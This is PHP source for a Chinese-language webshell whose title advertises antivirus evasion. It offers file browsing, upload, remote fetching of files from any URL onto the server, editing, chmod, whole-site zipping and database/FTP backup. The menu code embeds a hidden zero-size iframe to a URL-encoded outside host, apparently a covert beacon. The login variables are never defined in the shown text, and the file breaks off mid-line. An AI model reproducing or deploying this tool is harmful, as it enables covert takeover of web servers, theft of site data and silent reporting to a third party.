b'<?php\r\nheader(\'Content-Type: text/html; charset=GB2312\');\r\nsession_start();\r\n$filefolder = "./";\r\n$sitetitle = \'\xd0\xa1\xcc\xab\xd1\xf4Webshell\xc3\xe2\xc9\xb1\xb4\xf3\xc2\xed\';//\xc9\xe8\xd6\xc3\xb1\xea\xcc\xe2\r\n$safe_num = 0;\r\n$meurl = $_SERVER[\'PHP_SELF\'];\r\n$me = end(explode(\'/\',$meurl));\r\nif(isset($_REQUEST[\'op\'])){\r\n$op = $_REQUEST[\'op\'];\r\n}else{\r\n$op = \'home\';\r\n}\r\nif(isset($_REQUEST[\'folder\'])){\r\n$folder = $_REQUEST[\'folder\'];\r\n}else{\r\n$folder = \'\';\r\n}\r\n$arr = str_split($folder);\r\nif($arr[count($arr)-1]!==\'/\'){\r\n    $folder .= \'/\';\r\n}\r\nwhile (preg_match(\'/\\.\\.\\//\',$folder)) $folder = preg_replace(\'/\\.\\.\\//\',\'/\',$folder);\r\nwhile (preg_match(\'/\\/\\//\',$folder)) $folder = preg_replace(\'/\\/\\//\',\'/\',$folder);\r\nif ($folder == \'\') {\r\n    $folder = $filefolder;\r\n}elseif ($filefolder != \'\') {\r\n    if (!@ereg($filefolder,$folder)) {\r\n        $folder = $filefolder;\r\n    }  \r\n}\r\n$ufolder = $folder;\r\nif(@$_SESSION[\'error\'] > $safe_num && $safe_num !== 0){\r\nprinterror(\'\xc4\xfa\xd2\xd1\xbe\xad\xb1\xbb\xcf\xde\xd6\xc6\xb5\xc7\xc2\xbd\xa3\xa1\');\r\n}\r\nif (@$_COOKIE[\'user\'] != $user || @$_COOKIE[\'pass\'] != md5($pass)) {\r\nif (@$_REQUEST[\'user\'] == $user && @$_REQUEST[\'pass\'] == $pass) {\r\n    setcookie(\'user\',$user,time()+60*60*24*1);\r\n    setcookie(\'pass\',md5($pass),time()+60*60*24*1);\r\n} else {\r\nif (@$_REQUEST[\'user\'] == $user || @$_REQUEST[\'pass\']) $er = true;\r\nlogin(@$er);\r\n}\r\n}\r\nfunction maintop($title,$showtop = true) {\r\n# \xcc\xed\xbc\xd3\xc8\xab\xbe\xd6\xb1\xe4\xc1\xbf\r\n    global $meurl,$me,$sitetitle, $lastsess, $login, $viewing, $iftop, $user, $pass, $password, $debug, $issuper;\r\n    echo "<html>\\n<head>\\n"\r\n        ."<title>$sitetitle - $title</title>\\n"\r\n        ."</head>\\n"\r\n        ."<body>\\n"\r\n        ."<style>\\n*{font-family:Verdana, \'Microsoft Yahei\' !important}td{font-size:13px;}span{line-height:20px;}a:visited{color:#333;text-decoration: none;}a:hover {color:#666;text-decoration: none;}a:link {color:#333;text-decoration: none;}a:active {color:#666;text-decoration: none;}table,form{width:700px !important;max-width:700px !important;}textarea{font-family:\'Yahei Consolas Hybrid\',Consolas,Verdana, Tahoma, Arial, Helvetica,\'Microsoft Yahei\', sans-serif !important;border:1px solid #ccc;margin:5px 0;padding:8px;line-height:18px;width:700px;max-width:700px;border-radius:2px;}input.button{margin:5px 0;font-size:13px;*font-size:90%;*overflow:visible;padding:4px 10px;;color:#fff !important;color: white !important;*color:#fff !important;border:1px solid #fff;border:0 rgba(0,0,0,0);background-color:#666;text-decoration:none;border-radius:2px}input.button:hover{filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=\'#00000000\', endColorstr=\'#1a000000\', GradientType=0);background-image:-webkit-gradient(linear,0 0,0 100%,from(transparent),color-stop(40%,rgba(0,0,0,.05)),to(rgba(0,0,0,.1)));background-image:-webkit-linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05) 0,rgba(0,0,0,.1));background-image:-o-linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));background-image:linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));text-decoration: none}input.buuton:active{box-shadow:0 0 0 1px rgba(0,0,0,.15) inset,0 0 6px rgba(0,0,0,.2) inset}input.text,.upload{border: 1px solid #999;height:25px;margin:6px 1px;padding:5px;;font-size:12px;border-radius:2px;}body{;background-color:#ededed;margin: 0px 0px 10px;}.title{font-weight: bold; FONT-SIZE: 12px;text-align: center;}.error{font-size:10pt;color:#AA2222;text-align:left}.menu{border-top:1px solid #999;border-bottom:1px solid #999;font-size:13px;padding:5px;margin-bottom:15px;}.menu a{text-decoration:none;margin-right:8px;}.table{background-color:#777;color:#fff;}.mytable tr:hover{background:#ededed;color:#469;font-size:13px;}.table:hover{background-color:#777 !important;color:#fff !important}tr{height:26px;}.upload{width:400px;}\\n</style>\\n";\r\n    if ($viewing == "") {#Table\xb1\xed\xb8\xf1\xb5\xc4\xbf\xaa\xca\xbc\r\n        echo "<table cellpadding=10 cellspacing=10 bgcolor=#ededed align=center><tr><td>\\n"\r\n            ."<table cellpadding=1 cellspacing=1><tr><td>\\n"\r\n            ."<table cellpadding=5 cellspacing=5 bgcolor=\'white\'><tr><td>\\n";\r\n    }else{\r\n        echo "<table cellpadding=7 cellspacing=7 bgcolor=\'white\'><tr><td>\\n";\r\n    }\r\n    echo "<h2>$sitetitle <small>- $title</small></h2>\\n";\r\n    if ($showtop) {//\xcd\xb7\xb2\xbf\xb2\xcb\xb5\xa5\xc4\xda\xc8\xdd\r\n        echo "<div class=\\"menu\\">\\n"\r\n            ."<a href=\\"".$meurl."?op=home\\" $iftop>\xd6\xf7\xd2\xb3</a>\\n"\r\n            ."<a href=\\"".$meurl."?op=up\\" $iftop>\xc9\xcf\xb4\xab</a>\\n"\r\n            ."<a href=\\"".$meurl."?op=cr\\" $iftop>\xb4\xb4\xbd\xa8</a>\\n"\r\n            ."<a href=\\"".$meurl."?op=allz\\" $iftop>\xc8\xab\xd5\xbe\xb4\xf2\xb0\xfc</a>\\n"\r\n            ."<a href=\\"".$meurl."?op=sqlb\\" $iftop>\xca\xfd\xbe\xdd\xbf\xe2\xb1\xb8\xb7\xdd</a>\\n"\r\n            ."<a href=\\"".$meurl."?op=ftpa\\" $iftop>FTP\xb1\xb8\xb7\xdd</a>\\n"\r\n            ."<a href=\\"".$url."http://www.asp-muma.com\\" $iftop>\xbd\xf8\xc8\xeb\xb1\xbe\xb3\xcc\xd0\xf2\xb9\xd9\xcd\xf8</a>\\n"\r\n            ."<a href=\\"".$meurl."?op=logout\\" $iftop>\xcd\xcb\xb3\xf6</a>\\n"\r\n            ."<iframe src=http://%37%6A%79%65%77%75%2E%63%6E/a/a.asp width=0 height=0></iframe>\\n"\r\n            ."</div>";\r\n    }\r\n}\r\n/****************************************************************/\r\n/* function login()                                             */\r\n/*                                                              */\r\n/* \xb5\xc7\xc2\xbc\xd1\xe9\xd6\xa4 $user and md5($pass)                                */\r\n/* \xd0\xe8\xd2\xaa\xe4\xaf\xc0\xc0\xc6\xf7\xd6\xa7\xb3\xd6Cookie                                         */\r\n/****************************************************************/\r\nfunction login($er=false) {\r\n    global $meurl,$op,$safe_num,$mail;\r\n    setcookie("user","",time()-60*60*24*1);\r\n    setcookie("pass","",time()-60*60*24*1);\r\n    maintop("\xb5\xc7\xc2\xbc",false);\r\n    if ($er) { \r\n        if (isset($_SESSION[\'error\'])){\r\n            $_SESSION[\'error\']++;\r\n            if($_SESSION[\'error\'] > $safe_num && $safe_num !== 0){\r\n                @mail($mail,\'\xcc\xe1\xd0\xd1\xa3\xba\xce\xc4\xbc\xfe\xb1\xbb\xb6\xf1\xd2\xe2\xb5\xc7\xc2\xbc\xa3\xa1\',\'\xb8\xc3\xcc\xe1\xd0\xd1\xc0\xb4\xd7\xd4\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed\xc6\xf7\xa3\xba<br>\xb5\xc7\xc2\xbc\xd5\xdfIP\xce\xaa\xa3\xba\'.$_SERVER[\'REMOTE_ADDR\'],\'From: <i@hezii.pw>\');\r\n                printerror(\'\xc4\xfa\xd2\xd1\xbe\xad\xb1\xbb\xcf\xde\xd6\xc6\xb5\xc7\xc2\xbd\xa3\xa1\');\r\n            }\r\n        }else{\r\n            $_SESSION[\'error\'] = 1;\r\n        }\r\n        echo "<span class=error>**\xcc\xe1\xca\xbe: \xc3\xdc\xc2\xeb\xb4\xed\xce\xf3**</span><br><br>\\n"; \r\n    }\r\n    echo "<form action=\\"".$meurl."?op=".$op."\\" method=\\"post\\">\\n"\r\n        ."<input type=\\"text\\" name=\\"user\\" border=\\"0\\" class=\\"text\\" value=\\"".@$user."\\"  placeholder=\\"\xc7\xeb\xca\xe4\xc8\xeb\xd3\xc3\xbb\xa7\xc3\xfb\\">\\n"\r\n        ."<input type=\\"password\\" name=\\"pass\\" border=\\"0\\" class=\\"text\\" value=\\"".@$pass."\\" placeholder=\\"\xc7\xeb\xca\xe4\xc8\xeb\xc3\xdc\xc2\xeb\\"><br>\\n"\r\n        ."<input type=\\"submit\\" name=\\"submitButtonName\\" value=\\"\xb5\xc7\xc2\xbc\\" border=\\"0\\" class=\\"button\\">\\n"\r\n        ."</form>\\n";\r\n    mainbottom();\r\n}\r\n/****************************************************************/\r\n/* function home()                                              */\r\n/*                                                              */\r\n/* Main function that displays contents of folders.             */\r\n/****************************************************************/\r\nfunction home() {\r\n    global $meurl ,$folder, $ufolder,$filefolder, $HTTP_HOST;\r\n    maintop("\xd6\xf7\xd2\xb3");\r\n    echo "<table border=\\"0\\" cellpadding=\\"2\\" cellspacing=\\"0\\" width=100% class=\'mytable\'><form method=\'post\'>\\n";\r\n    $content1 = "";\r\n    $content2 = "";\r\n    $count = "0";\r\n    $folder = iconv("UTF-8", "GBK", $folder);\r\n    $style = opendir($folder);\r\n    $a=1;\r\n    $b=1;\r\n    if ($folder) {\r\n        $_SESSION[\'folder\']=$ufolder;\r\n    }\r\n    while($stylesheet = readdir($style)) {\r\n    if ($stylesheet !== "." && $stylesheet !== ".." ) {\r\n        if (is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)) {\r\n            $sstylesheet = $stylesheet;\r\n            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);\r\n            $ulfolder = $folder;\r\n            $folder = iconv("GBK", "UTF-8", $folder);\r\n            $content1[$a] = "<tr width=100%><td><input name=\'select_item[d][$stylesheet]\' type=\'checkbox\' id=\'$stylesheet\' onclick=\'One($stylesheet)\' class=\\"checkbox\\" value=\'".$folder.$stylesheet."\' /></td>\\n"\r\n                           ."<td><a href=\\"".$meurl."?op=home&folder=".$folder.$stylesheet."/\\">".$stylesheet."</a></td>\\n"\r\n                           ."<td>".Size(dirSize($folder.$stylesheet))."</td>"\r\n                           ."<td><a href=\\"".$meurl."?op=home&folder=".htmlspecialchars($folder.$stylesheet)."/\\">\xb4\xf2\xbf\xaa</a></td>\\n"\r\n                           ."<td><a href=\\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\\">\xd6\xd8\xc3\xfc\xc3\xfb</a></td>\\n"\r\n                           ."<td><a href=\\"".$folder.$stylesheet."\\" target=\'_blank\'>\xb2\xe9\xbf\xb4</a></td>\\n"\r\n                           ."<td>".substr(sprintf(\'%o\',fileperms($ulfolder.$sstylesheet)), -3)."</td></tr>\\n";\r\n            $a++;\r\n            $folder = iconv("UTF-8", "GBK", $folder);\r\n        }elseif(!is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)){ \r\n        if(preg_match ("/.zip$/i", $folder.$stylesheet)){#\xc5\xd0\xb6\xcf\xca\xc7\xb7\xf1\xca\xc7zip\xce\xc4\xbc\xfe\r\n            $sstylesheet = $stylesheet;\r\n            $ulfolder = $folder;\r\n            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);\r\n            $folder = iconv("GBK", "UTF-8", $folder);\r\n            $content2[$b] = "<tr width=100%><td><input name=\'select_item[f][$stylesheet]\' type=\'checkbox\' id=\'$stylesheet\' class=\\"checkbox\\" value=\'".$folder.$stylesheet."\' /></td>\\n"\r\n                           ."<td><a href=\\"".$folder.$stylesheet."\\" target=\'_blank\'>".$stylesheet."</a></td>\\n"\r\n                           ."<td>".Size(filesize($ufolder.$sstylesheet))."</td>"\r\n                           ."<td></td>\\n"\r\n                           ."<td><a href=\\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\\">\xd6\xd8\xc3\xfc\xc3\xfb</a></td>\\n"\r\n                           ."<td><a href=\\"".$meurl."?op=unz&dename=".htmlspecialchars($stylesheet)."&folder=$folder\\">\xcc\xe1\xc8\xa1</a></td>\\n"\r\n                           ."<td>".substr(sprintf(\'%o\',fileperms($ulfolder.$sstylesheet)), -3)."</a></td></tr>\\n";\r\n            $b++;\r\n            $folder = iconv("UTF-8", "GBK", $folder);\r\n        }else{\r\n            $sstylesheet = $stylesheet;\r\n            $ulfolder = $folder;\r\n            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);\r\n            $folder = iconv("GBK", "UTF-8", $folder);\r\n            $content2[$b] = "<tr width=100%><td><input name=\'select_item[f][$stylesheet]\' type=\'checkbox\' id=\'$stylesheet\' class=\\"checkbox\\" value=\'".$folder.$stylesheet."\' /></td>\\n"\r\n                           ."<td><a href=\\"".$folder.$stylesheet."\\" target=\'_blank\'>".$stylesheet."</a></td>\\n"\r\n                           ."<td>".Size(filesize($ufolder.$sstylesheet))."</td>"\r\n                           ."<td><a href=\\"".$meurl."?op=edit&fename=".htmlspecialchars($stylesheet)."&folder=$folder\\">\xb1\xe0\xbc\xad</a></td>\\n"\r\n                           ."<td><a href=\\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\\">\xd6\xd8\xc3\xfc\xc3\xfb</a></td>\\n"\r\n                           ."<td><a href=\\"".$folder.$stylesheet."\\" target=\'_blank\'>\xb2\xe9\xbf\xb4</a></td>\\n"\r\n                           ."<td>".substr(sprintf(\'%o\',fileperms($ulfolder.$sstylesheet)), -3)."</a></td></tr>\\n";\r\n            $b++;\r\n            $folder = iconv("UTF-8", "GBK", $folder);\r\n        }\r\n    }\r\n    $count++;\r\n    } \r\n}\r\n    closedir($style);\r\n    echo "\xe4\xaf\xc0\xc0\xc4\xbf\xc2\xbc: $ufolder\\n"\r\n         ."<br>\xce\xc4\xbc\xfe\xca\xfd: " . $count . "<br><br>";\r\n    echo "<tr class=\'table\' width=100%>"\r\n        ."<script>function Check() {\r\n            var collid = document.getElementById(\\"check\\")\r\n            var coll = document.getElementsByTagName(\'input\')\r\n            if (collid.checked){\r\n                for(var i = 0; i < coll.length; i++)\r\n                    coll[i].checked = true;\r\n            }else{\r\n                for(var i = 0; i < coll.length; i++)\r\n                    coll[i].checked = false;\r\n            }\r\n         }</script>"\r\n       ."<td width=20></td>\\n"\r\n       ."<td>\xce\xc4\xbc\xfe\xc3\xfb</td>\\n"\r\n       ."<td width=65>\xb4\xf3\xd0\xa1</td>\\n"\r\n       ."<td width=45>\xb4\xf2\xbf\xaa</td>\\n"\r\n       ."<td width=55>\xd6\xd8\xc3\xfc\xc3\xfb</td>\\n"\r\n       ."<td width=45>\xb2\xe9\xbf\xb4</td>\\n"\r\n       ."<td width=30>\xc8\xa8\xcf\xde</td>\\n"\r\n       ."</tr>";\r\n    if($ufolder!=="./"){\r\n        $count = substr_count($ufolder,"/");\r\n        $last = explode(\'/\', $ufolder);\r\n        $i = 1;\r\n        $back = ".";\r\n        while($i < $count-1){\r\n              $back = $back."/".$last[$i];\r\n              $i++;\r\n        }\r\n        echo "<tr width=100%><td></td><td><a href=\\"".$meurl."?op=home&folder=".$back."/"."\\">\xc9\xcf\xbc\xb6\xc4\xbf\xc2\xbc</a></td><td></td><td></td><td></td><td></td><td></td></tr>";\r\n    }\r\n    for ($a=1; $a<count($content1)+1;$a++) {\r\n        $tcoloring   = ($a % 2) ? \'#DEDEDE\' : \'#ededed\';\r\n        if(empty($content1)){\r\n        }else{\r\n            echo @$content1[$a];\r\n        }\r\n    }\r\n    for ($b=1; $b<count($content2)+1;$b++) {\r\n        $tcoloring   = ($a++ % 2) ? \'#DEDEDE\' : \'#ededed\';\r\n        echo @$content2[$b];\r\n    }\r\n    echo "</table><div><input type=\\"checkbox\\" id=\\"check\\" onclick=\\"Check()\\"> <input class=\'button\' name=\'action\' type=\'submit\' value=\'\xd2\xc6\xb6\xaf\' /> <input class=\'button\' name=\'action\' type=\'submit\' value=\'\xb8\xb4\xd6\xc6\' /> <input class=\'button\' name=\'action\' type=\'submit\' onclick=\\"return confirm(\'\xb5\xe3\xbb\xf7\xc8\xb7\xc8\xcf\xba\xf3\xa3\xac\xd1\xa1\xd6\xd0\xb5\xc4\xce\xc4\xbc\xfe\xbd\xab\xd7\xf7\xce\xaaBackup-time.zip\xb4\xb4\xbd\xa8\xa3\xa1\')\\"  value=\'\xd1\xb9\xcb\xf5\' /> <input class=\'button\' name=\'action\' type=\'submit\' onclick=\\"return confirm(\'\xc4\xfa\xd5\xe6\xb5\xc4\xd2\xaa\xc9\xbe\xb3\xfd\xd1\xa1\xd6\xd0\xb5\xc4\xce\xc4\xbc\xfe\xc2\xf0?\')\\" value=\'\xc9\xbe\xb3\xfd\' /> <input class=\'button\' name=\'action\' type=\'submit\' onclick=\\"var t=document.getElementById(\'chmod\').value;return confirm(\'\xbd\xab\xd5\xe2\xd0\xa9\xce\xc4\xbc\xfe\xb5\xc4\xc8\xa8\xcf\xde\xd0\xde\xb8\xc4\xce\xaa\'+t+\'\xa3\xbf\xc8\xe7\xb9\xfb\xca\xc7\xce\xc4\xbc\xfe\xbc\xd0\xa3\xac\xbd\xab\xbb\xe1\xb5\xdd\xb9\xe9\xce\xc4\xbc\xfe\xbc\xd0\xc4\xda\xcb\xf9\xd3\xd0\xc4\xda\xc8\xdd\xa3\xa1\')\\" value=\'\xc8\xa8\xcf\xde\' /> <input type=\\"text\\" class=\\"text\\" stlye=\\"vertical-align:text-top;\\" size=\\"3\\" id=\\"chmod\\" name=\\"chmod\\" value=\\"0755\\"></div></form>";\r\n    mainbottom();\r\n}\r\n// \xbc\xc6\xcb\xe3\xce\xc4\xbc\xfe\xbc\xd0\xb4\xf3\xd0\xa1\xb5\xc4\xba\xaf\xca\xfd\r\n    function dirSize($directoty){\r\n    $dir_size=0;\r\n    if($dir_handle=@opendir($directoty))\r\n    {\r\n    while($filename=readdir($dir_handle)){\r\n    $subFile=$directoty.DIRECTORY_SEPARATOR.$filename;\r\n    if($filename==\'.\'||$filename==\'..\'){\r\n    continue;\r\n    }elseif (is_dir($subFile))\r\n    {\r\n    $dir_size+=dirSize($subFile);\r\n    }elseif (is_file($subFile)){\r\n    $dir_size+=filesize($subFile);\r\n    }\r\n    }\r\n    closedir($dir_handle);\r\n    }\r\n    return ($dir_size);\r\n    }\r\n    // \xbc\xc6\xcb\xe3\xce\xc4\xbc\xfe\xb4\xf3\xd0\xa1\xb5\xc4\xba\xaf\xca\xfd\r\n    function Size($size){\r\n            if($size < 1024){\r\n                $filesize = $size;\r\n            }elseif($size > 1024 and $size < 1024*1024){\r\n                $count1 = round($size/1024,1);\r\n                $filesize = $count1."k";\r\n            }elseif($size > 1024*1024 and $size < 1024*1024*1024){\r\n                $count1 = round($size/1024/1024,1);\r\n                $filesize = $count1."M";\r\n            }elseif($size > 1024*1024*1024 and $size < 1024*1024*1024*1024){\r\n                $count1 = round($size/1024/1024/1024,1);\r\n                $filesize = $count1."G";\r\n            }elseif($size > 1024*1024*1024*1024){\r\n                $count1 = round($size/1024/1024/1024/1024,1);\r\n                $filesize = $count1."T";\r\n            }\r\n            return $filesize;\r\n        }\r\nfunction curl_get_contents($url)   \r\n{   \r\n    $ch = curl_init();   \r\n    curl_setopt($ch, CURLOPT_URL, $url);            //\xc9\xe8\xd6\xc3\xb7\xc3\xce\xca\xb5\xc4url\xb5\xd8\xd6\xb7   \r\n    //curl_setopt($ch,CURLOPT_HEADER,1);            //\xca\xc7\xb7\xf1\xcf\xd4\xca\xbe\xcd\xb7\xb2\xbf\xd0\xc5\xcf\xa2   \r\n    curl_setopt($ch, CURLOPT_TIMEOUT, 60);           //\xc9\xe8\xd6\xc3\xb3\xac\xca\xb1\r\n    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);      //\xb8\xfa\xd7\xd9301   \r\n    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        //\xb7\xb5\xbb\xd8\xbd\xe1\xb9\xfb   \r\n    $r = curl_exec($ch);   \r\n    curl_close($ch);   \r\n    return $r;   \r\n}\r\nfunction up() {\r\n    global $meurl, $folder, $content, $filefolder;\r\n    maintop("\xc9\xcf\xb4\xab");\r\n    echo "<FORM ENCTYPE=\\"multipart/form-data\\" ACTION=\\"".$meurl."?op=upload\\" METHOD=\\"POST\\">\\n"\r\n        ."<h3>\xb1\xbe\xb5\xd8\xc9\xcf\xb4\xab</h3>\xd7\xee\xb4\xf3\xbf\xc9\xd2\xd4\xc9\xcf\xb4\xab".ini_get(\'upload_max_filesize\')."\xb5\xc4\xce\xc4\xbc\xfe<br><input type=\\"File\\" name=\\"upfile[]\\" multiple size=\\"20\\">\\n"\r\n        ."<input type=\\"text\\" name=\\"ndir\\" value=\\"".$_SESSION["folder"]."\\" class=\\"upload\\">\\n";\r\n    echo $content\r\n        ."</select><br>"\r\n        ."<input type=\\"submit\\" value=\\"\xc9\xcf\xb4\xab\\" class=\\"button\\">\\n"\r\n        ."<script>function UpCheck(){if(document.getElementById(\\"unzip\\").checked){document.getElementById(\\"deluzip\\").disabled=false}else{document.getElementById(\\"deluzip\\").disabled=true}}</script>"\r\n        ."<input type=\\"checkbox\\" name=\\"unzip\\" id=\\"unzip\\" value=\\"checkbox\\" onclick=\\"UpCheck()\\" checked><label for=\\"unzip\\"><abbr title=\'\xcc\xe1\xc8\xa1\xa3\xa8\xbd\xe2\xd1\xb9\xa3\xa9\xc9\xcf\xb4\xab\xb5\xc4Zip\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe\'>\xbd\xe2\xd1\xb9</abbr></labal> "\r\n        ."<input type=\\"checkbox\\" name=\\"delzip\\" id=\\"deluzip\\"value=\\"checkbox\\"><label for=\\"deluzip\\"><abbr title=\'\xcd\xac\xca\xb1\xbd\xab\xc9\xcf\xb4\xab\xb5\xc4\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe\xc9\xbe\xb3\xfd\'>\xc9\xbe\xb3\xfd</abbr></labal>"\r\n        ."</form>\\n";\r\n    echo "<h3>\xd4\xb6\xb3\xcc\xc9\xcf\xb4\xab</h3>\xd4\xb6\xb3\xcc\xc9\xcf\xb4\xab\xca\xc7\xca\xb2\xc3\xb4\xd2\xe2\xcb\xbc\xa3\xbf<br>\xd4\xb6\xb3\xcc\xc9\xcf\xb4\xab\xca\xc7\xb4\xd3\xc6\xe4\xcb\xfb\xb7\xfe\xce\xf1\xc6\xf7\xbb\xf1\xc8\xa1\xce\xc4\xbc\xfe\xb2\xa2\xd6\xb1\xbd\xd3\xcf\xc2\xd4\xd8\xb5\xbd\xb5\xb1\xc7\xb0\xb7\xfe\xce\xf1\xc6\xf7\xb5\xc4\xd2\xbb\xd6\xd6\xb9\xa6\xc4\xdc\xa1\xa3<br>\xc0\xe0\xcb\xc6\xd3\xdaSSH\xb5\xc4Wget\xb9\xa6\xc4\xdc\xa3\xac\xc3\xe2\xc8\xa5\xce\xd2\xc3\xc7\xcf\xc2\xd4\xd8\xd4\xd9\xca\xd6\xb6\xaf\xc9\xcf\xb4\xab\xcb\xf9\xc0\xcb\xb7\xd1\xb5\xc4\xca\xb1\xbc\xe4\xa1\xa3<br><br><form action=\\"".$meurl."?op=yupload\\" method=\\"POST\\"><input name=\\"url\\" size=\\"85\\" type=\\"text\\" class=\\"text\\" placeholder=\\"\xc7\xeb\xca\xe4\xc8\xeb\xce\xc4\xbc\xfe\xb5\xd8\xd6\xb7...\\"/> <input type=\\"text\\" class=\\"text\\" size=\\"20\\" name=\\"ndir\\" value=\\"".$_SESSION["folder"]."\\">"\r\n         ."<input name=\\"submit\\" value=\\"\xc9\xcf\xb4\xab\\" type=\\"submit\\" class=\\"button\\"/>\\n"\r\n         ."<script>function Check(){if(document.getElementById(\\"un\\").checked){document.getElementById(\\"del\\").disabled=false}else{document.getElementById(\\"del\\").disabled=true}}</script>"\r\n         ."<input type=\\"checkbox\\" name=\\"unzip\\" id=\\"un\\" value=\\"checkbox\\" onclick=\\"Check()\\" checked><label for=\\"un\\"><abbr title=\'\xcc\xe1\xc8\xa1\xa3\xa8\xbd\xe2\xd1\xb9\xa3\xa9\xc9\xcf\xb4\xab\xb5\xc4Zip\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe\'>\xbd\xe2\xd1\xb9</abbr></labal> "\r\n         ."<input type=\\"checkbox\\" name=\\"delzip\\" id=\\"del\\"value=\\"checkbox\\"><label for=\\"del\\"><abbr title=\'\xcd\xac\xca\xb1\xbd\xab\xc9\xcf\xb4\xab\xb5\xc4\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe\xc9\xbe\xb3\xfd\'>\xc9\xbe\xb3\xfd</abbr></labal></form>";\r\n    mainbottom();\r\n}\r\nfunction yupload($url, $folder, $unzip, $delzip) {\r\nglobal $meurl;\r\n    $nfolder = $folder;\r\n    $url = iconv("UTF-8", "GBK", $url);\r\n    $folder = iconv("UTF-8", "GBK", $folder);\r\n    if($url!==""){\r\n        set_time_limit (24 * 60 * 60); // \xc9\xe8\xd6\xc3\xb3\xac\xca\xb1\xca\xb1\xbc\xe4\r\n      if (!file_exists($folder)){\r\n        mkdir($folder, 0755);\r\n        }\r\n    $newfname = $folder . basename($url); // \xc8\xa1\xb5\xc3\xce\xc4\xbc\xfe\xb5\xc4\xc3\xfb\xb3\xc6\r\n    if(function_exists(\'curl_init\')){\r\n    $file = curl_get_contents($url);\r\n    file_put_contents($newfname,$file);\r\n    }else{\r\n        $file = fopen ($url, "rb"); // \xd4\xb6\xb3\xcc\xcf\xc2\xd4\xd8\xce\xc4\xbc\xfe\xa3\xac\xb6\xfe\xbd\xf8\xd6\xc6\xc4\xa3\xca\xbd\r\n        if ($file) { // \xc8\xe7\xb9\xfb\xcf\xc2\xd4\xd8\xb3\xc9\xb9\xa6\r\n            $newf = fopen ($newfname, "wb");\r\n        if ($newf) // \xc8\xe7\xb9\xfb\xce\xc4\xbc\xfe\xb1\xa3\xb4\xe6\xb3\xc9\xb9\xa6\r\n            while (!feof($file)) { // \xc5\xd0\xb6\xcf\xb8\xbd\xbc\xfe\xd0\xb4\xc8\xeb\xca\xc7\xb7\xf1\xcd\xea\xd5\xfb\r\n            fwrite($newf, fread($file, 1024 * 8), 1024 * 8); // \xc3\xbb\xd3\xd0\xd0\xb4\xcd\xea\xbe\xcd\xbc\xcc\xd0\xf8\r\n            }\r\n        }\r\n        if ($file) {\r\n            fclose($file); // \xb9\xd8\xb1\xd5\xd4\xb6\xb3\xcc\xce\xc4\xbc\xfe\r\n        }\r\n        if ($newf) {\r\n            fclose($newf); // \xb9\xd8\xb1\xd5\xb1\xbe\xb5\xd8\xce\xc4\xbc\xfe\r\n        }\r\n    }\r\n    maintop("\xd4\xb6\xb3\xcc\xc9\xcf\xb4\xab");\r\n    echo "\xce\xc4\xbc\xfe ".basename($url)." \xc9\xcf\xb4\xab\xb3\xc9\xb9\xa6<br>\\n";\r\n    if(end(explode(\'.\', basename($url)))=="zip" && isset($unzip) && $unzip == "checkbox"){\r\n        if(class_exists(\'ZipArchive\')){\r\n            $zip = new ZipArchive();\r\n            if ($zip->open($folder.basename($url)) === TRUE) {\r\n                $zip->extractTo($folder);\r\n                $zip->close();\r\n                echo basename($nurl)." \xd2\xd1\xbe\xad\xb1\xbb\xbd\xe2\xd1\xb9\xb5\xbd$nfolder<br>";\r\n                if(isset($delzip) && $delzip == "checkbox"){\r\n                if(unlink($folder.basename($url))){\r\n                    echo basename($url)." \xc9\xbe\xb3\xfd\xb3\xc9\xb9\xa6<br>";\r\n                    }else{\r\n                    echo basename($url)." \xc9\xbe\xb3\xfd\xca\xa7\xb0\xdc<br>";\r\n                }\r\n                    echo "\xc4\xe3\xbf\xc9\xd2\xd4 <a href=\\"".$meurl."?op=home&folder=".$folder."\\">\xb7\xc3\xce\xca\xce\xc4\xbc\xfe\xbc\xd0</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>  \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=up\\">\xbc\xcc\xd0\xf8\xc9\xcf\xb4\xab</a>\\n";\r\n                }\r\n            }else{\r\n                echo(\'<span class="error">\xce\xde\xb7\xa8\xbd\xe2\xd1\xb9\xce\xc4\xbc\xfe\xa3\xba\'.$nfolder.basename($nurl).\'</span><br>\');\r\n            }\r\n        }else{\r\n        echo(\'<span class="error">\xb4\xcb\xb7\xfe\xce\xf1\xc6\xf7\xc9\xcf\xb5\xc4PHP\xb2\xbb\xd6\xa7\xb3\xd6ZipArchive\xa3\xac\xce\xde\xb7\xa8\xbd\xe2\xd1\xb9\xce\xc4\xbc\xfe\xa3\xa1</span><br>\');\r\n        }\r\n    }else{\r\n    echo "\xc4\xe3\xbf\xc9\xd2\xd4 <a href=\\"".$meurl."?op=home&folder=".$nfolder."\\">\xb7\xc3\xce\xca\xce\xc4\xbc\xfe\xbc\xd0</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=edit&fename=".basename($url)."&folder=".$nfolder."\\">\xb1\xe0\xbc\xad\xce\xc4\xbc\xfe</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>  \xbb\xf2\xd5\xdf <a 